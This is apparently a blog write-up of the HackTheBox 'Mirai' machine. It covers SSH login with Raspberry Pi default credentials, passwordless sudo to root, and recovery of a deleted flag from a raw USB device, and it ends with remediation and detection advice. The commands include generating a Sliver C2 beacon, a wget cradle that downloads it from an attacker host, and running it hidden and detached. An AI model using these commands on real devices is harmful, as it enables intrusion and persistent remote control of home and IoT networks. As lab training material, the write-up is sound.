---
layout: default
title: "HackTheBox - Mirai"
---

# HackTheBox - Mirai

**OS:** Linux (Raspbian / Debian Jessie, i686)

Mirai is a Linux box themed around the Mirai botnet, which compromised hundreds of
thousands of IoT devices by exploiting vendor-default credentials. Initial access is a
direct SSH login using the Raspberry Pi published default `pi:raspberry` credential pair.
On first foothold a Sliver beacon is deployed via wget download cradle; all subsequent
post-access work runs through the beacon. Root is trivial via passwordless `sudo`.
The root flag was "accidentally deleted" -- the bytes remain on the raw block device and
`sudo strings /dev/sdb` recovers them in one command.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` |
| Initial Access | SSH with Raspberry Pi default credentials (`pi:raspberry`) |
| C2 Delivery | wget download cradle → Sliver Linux 386 beacon → HTTPS/443 |
| Privilege Escalation | Passwordless `sudo` |
| Root Flag Recovery | `strings` on raw block device (`/dev/sdb`) |
| Final Access | `root` (via beacon shell) |

---

## Recon

### Port Scan

p0rtix ran a quick scan followed by a full TCP sweep and UDP top-100. The service
fingerprint was immediately recognisable as a Raspberry Pi: Pi-hole (lighttpd/dnsmasq),
Plex Media Server, UPnP, mDNS, and NTP alongside SSH.

| Port | Proto | Service | Version |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 6.7p1 Debian 5+deb8u3 |
| 53 | TCP/UDP | DNS | dnsmasq 2.76 |
| 80 | TCP | HTTP | lighttpd 1.4.35 (Pi-hole) |
| 123 | UDP | NTP | NTP v4 |
| 1239 | TCP | UPnP | Platinum UPnP 1.0.5.13 |
| 5353 | UDP | mDNS | DNS-SD |
| 32400 | TCP | HTTP | Plex Media Server |
| 32469 | TCP | UPnP | Platinum UPnP 1.0.5.13 |

The lighttpd instance on port 80 confirmed Pi-hole via HTTP response headers. Pi-hole
running on port 80 alongside Plex and UPnP is the canonical Raspberry Pi home-server
stack. The default-credential angle was the immediate move.

---

## Initial Access

Raspberry Pi devices ship with a published default credential: `pi:raspberry`. These
are documented in the official Raspberry Pi documentation and left unchanged on a large
fraction of deployed devices -- the exact attack vector the Mirai botnet exploited at
scale.

```
kali@kali:~$ ssh -o StrictHostKeyChecking=no pi@<target-ip>
pi@<target-ip>'s password: raspberry

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)

pi@raspberrypi:~$ uname -m
i686
```

> **Why this works:** The SSH banner itself flags the problem -- the default password was
> never changed. The Pi-hole stack is commonly set up by hobbyists who treat DNS
> ad-blocking as a consumer appliance; hardening the underlying SSH is an afterthought.
> Note: despite the Raspberry Pi theme, the HTB instance runs on x86 hardware (i686),
> confirmed by `uname -m`. This matters for payload architecture selection.

---

## Post-Access: C2 (Sliver)

Sliver C2 was established immediately on first foothold. The standing HTTPS listener
was already up. No compatible linux/386 build was in the pool so a fresh beacon was
compiled:

```
sliver > generate beacon --https <attacker-ip>:443 --os linux --arch 386 --name pool-https-linux386 --format EXECUTABLE --save /tmp/

[*] Generating new linux/386 beacon implant binary
[*] Symbol obfuscation is enabled
[*] Build completed
[*] Implant saved to /tmp/pool-https-linux386
```

The beacon was served via a local Python HTTP server and downloaded by the target:

```
pi@raspberrypi:~$ wget -q http://<attacker-ip>:8888/pool-https-linux386 -O /tmp/.beacon
pi@raspberrypi:~$ chmod +x /tmp/.beacon
pi@raspberrypi:~$ nohup setsid /tmp/.beacon </dev/null >/dev/null 2>&1 &
[1] 4223
```

> **Why this works:** `setsid` creates a new session, breaking the SIGHUP propagation
> chain from the SSH parent. Combined with `nohup` and stdio redirected to `/dev/null`,
> the beacon process survives SSH session close fully detached.

Beacon checked in within 30 seconds:

```
sliver > beacons

 ID         Name                    Transport   Hostname      Username   PID    Last Check-in  Next Check-in
========== ======================= =========== ============= ========== ====== ============== ==============
 03b1a6b0   pool-https-linux386     https       raspberrypi   pi         4225   3s ago         27s
```

All subsequent flag collection was driven through the beacon:

```
sliver > use 03b1a6b0

sliver (pool-https-linux386) > execute -e /bin/sh -c 'id'

uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),
27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),
108(netdev),117(i2c),998(gpio),999(spi)
```

```
sliver (pool-https-linux386) > execute -e /bin/sh -c 'cat /home/pi/Desktop/user.txt'

<user-flag-redacted>
```

```
sliver (pool-https-linux386) > execute -e /bin/sh -c 'sudo strings /dev/sdb'

>r &
/media/usbstick
lost+found
root.txt
damnit.txt
...
<root-flag-redacted>
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```

---

## Privilege Escalation

The `pi` user has full `NOPASSWD` sudo. No password prompt, no secondary factor:

```
sliver (pool-https-linux386) > execute -e /bin/sh -c 'sudo id'

uid=0(root) gid=0(root) groups=0(root)
```

> **Why this works:** The default Raspberry Pi sudoers configuration grants `pi` full
> unrestricted root without a password. A compromised `pi` session is immediately a root
> session.

The canonical `root.txt` had been replaced with a note pointing to a USB stick:

```
sliver (pool-https-linux386) > execute -e /bin/sh -c 'sudo cat /root/root.txt'

I lost my original root.txt! I think I may have a backup on my USB stick...
```

---

## Root Flag Recovery

The USB stick is mounted at `/media/usbstick/` on device `/dev/sdb`. Its contents show
the flag was deleted:

```
sliver (pool-https-linux386) > execute -e /bin/sh -c 'ls -la /media/usbstick/'

total 18
drwxr-xr-x 3 root root  1024 Aug 14  2017 .
drwxr-xr-x 3 root root  4096 Aug 14  2017 ..
-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt
drwx------ 2 root root 12288 Aug 14  2017 lost+found
```

```
sliver (pool-https-linux386) > execute -e /bin/sh -c 'cat /media/usbstick/damnit.txt'

Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```

`strings` on the raw block device recovers the flag from unallocated space:

```
sliver (pool-https-linux386) > execute -e /bin/sh -c 'sudo strings /dev/sdb'

...
<root-flag-redacted>
...
```

> **Why this works:** When a file is deleted on an ext filesystem, the directory entry
> and inode are marked free but the data blocks are not zeroed. The bytes remain on disk
> until that sector is reused. `strings` scans raw binary data for printable ASCII
> sequences, which is sufficient to extract flag-format strings from unallocated blocks.
> `sudo` is required to read a raw block device as a non-root user; passwordless sudo
> makes this a single command.

---

## Root Cause

Two root causes combine:

1. **Default credentials never rotated.** The Raspberry Pi default `pi:raspberry` was
   left in place on a network-exposed SSH service. Any credential scanner reaches this
   foothold in seconds.
2. **Unrestricted passwordless sudo.** The default Raspberry Pi sudoers entry gives
   `pi` full root without a second factor. A compromised `pi` session is immediately a
   root session with access to raw block devices.

---

## Impact

Full root access on the device. Root gives arbitrary command execution, access to all
local credentials and keys, and full control of the Pi-hole DNS resolver. An attacker
controlling the DNS server can redirect any domain for any client using it -- in a home
or small-office environment, that is the entire network.

---

## Remediation

- **Rotate default credentials immediately.** The SSH banner itself warns about this.
  Change the `pi` password on first boot, or disable the `pi` account entirely.
- **Remove or restrict the `sudo` entry.** Grant only the specific commands that require
  privilege rather than full `NOPASSWD` root.
- **Restrict SSH access** to known IPs or key-based auth only; disable password
  authentication.
- **Securely erase storage** before decommissioning. `shred` or `wipe` a block device
  before handing it to another party; `rm` alone leaves data recoverable.

### Validation

Replay the attack after remediation: confirm `pi:raspberry` is rejected, confirm a
second credential or sudo password is required for any privileged command, and confirm
`strings /dev/sdb` returns no flag-format data.

---

## Detection Opportunities

- **Alert on SSH authentication with username `pi`** from any external IP. Legitimate
  Raspberry Pi administration rarely originates outside the local network.
- **Alert on `strings` or `dd` against raw block devices** (`/dev/sd*`). Legitimate
  forensics on a production device is unusual.
- **Monitor for `sudo su` or full-shell sudo invocations** from the `pi` account --
  a sign of full root escalation rather than a scoped privileged command.
- **Alert on outbound HTTPS to non-standard hosts** from IoT devices. Pi-hole, Plex,
  and mDNS do not require HTTPS callbacks to an operator IP.

---

## Lessons Learned

- Default IoT credentials are not theoretical risk -- the Mirai botnet infected 600,000+
  devices using exactly this vector in 2016. Any device with a default credential set
  and network-exposed SSH is a foothold.
- Architecture matters for payload delivery. The box is themed as Raspberry Pi (ARM) but
  runs as x86 i686 on HTB infrastructure. Always confirm `uname -m` before selecting
  beacon arch -- deploying an amd64 binary to an i686 host is a silent failure.
- `strings` on a block device is the quickest first pass for deleted-plaintext recovery.
  For structured recovery, `extundelete` or `photorec` can recover complete file
  structures from ext filesystems.

---

## Cleanup

```
sliver (pool-https-linux386) > execute -e /bin/sh -c 'rm /tmp/.beacon'

sliver (pool-https-linux386) > kill

[*] Killing beacon 03b1a6b0
```

- Beacon killed, `/tmp/.beacon` removed from target.
- HTTP server stopped; payload removed from serving directory.
- HTB machine stopped after flags submitted.
